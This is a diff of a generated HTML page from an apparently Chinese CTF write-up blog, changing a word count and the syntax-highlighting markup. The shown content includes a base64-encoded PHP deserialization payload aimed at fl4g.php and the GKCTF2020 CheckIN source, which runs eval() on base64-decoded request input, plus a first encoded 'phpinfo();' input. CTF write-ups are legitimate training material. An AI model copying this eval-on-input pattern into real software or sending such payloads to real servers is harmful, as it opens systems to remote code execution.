@@ -200,7 +200,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      892 字
+      885 字
     </span>
   
 
@@ -321,25 +321,25 @@ echo (base64_encode($b));
 <pre><code>O:+4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;
 O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;
 TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==          </code></pre>
-<h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a><code>[GKCTF2020]CheckIN</code></h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
-highlight_file(<span class="hljs-keyword">__FILE__</span>);
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassName</span></span>
-<span class="hljs-class"></span>&#123;
-        <span class="hljs-keyword">public</span> $code = <span class="hljs-literal">null</span>;
-        <span class="hljs-keyword">public</span> $decode = <span class="hljs-literal">null</span>;
-        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">        </span>&#123;
-                <span class="hljs-keyword">$this</span>-&gt;code = @<span class="hljs-keyword">$this</span>-&gt;x()[<span class="hljs-string">&#x27;Ginkgo&#x27;</span>];          <span class="hljs-comment">##以Ginkgo传参                  </span>
-                <span class="hljs-keyword">$this</span>-&gt;decode = @base64_decode( <span class="hljs-keyword">$this</span>-&gt;code );           <span class="hljs-comment">##base64解码</span>
-                @<span class="hljs-keyword">Eval</span>(<span class="hljs-keyword">$this</span>-&gt;decode);      <span class="hljs-comment">##执行</span>
-        &#125;
+<h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a><code>[GKCTF2020]CheckIN</code></h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">ClassName</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$decode</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'Ginkgo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token shell-comment comment">##以Ginkgo传参                  </span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">decode</span> <span class="token operator">=</span> @<span class="token function">base64_decode</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token shell-comment comment">##base64解码</span>
+                @<span class="token keyword">Eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">decode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token shell-comment comment">##执行</span>
+        <span class="token punctuation">&#125;</span>
 
-        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">        </span>&#123;
-                <span class="hljs-keyword">return</span> $_REQUEST;
-        &#125;
-&#125;
-<span class="hljs-keyword">new</span> ClassName();</code></pre></code></pre>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+                <span class="token keyword">return</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">new</span> <span class="token class-name">ClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      </span></code></pre></code></pre>
 <p>先传个phpinfo吧   </p>
 <pre><code>phpinfo();
 cGhwaW5mbygpOw==  </code></pre>
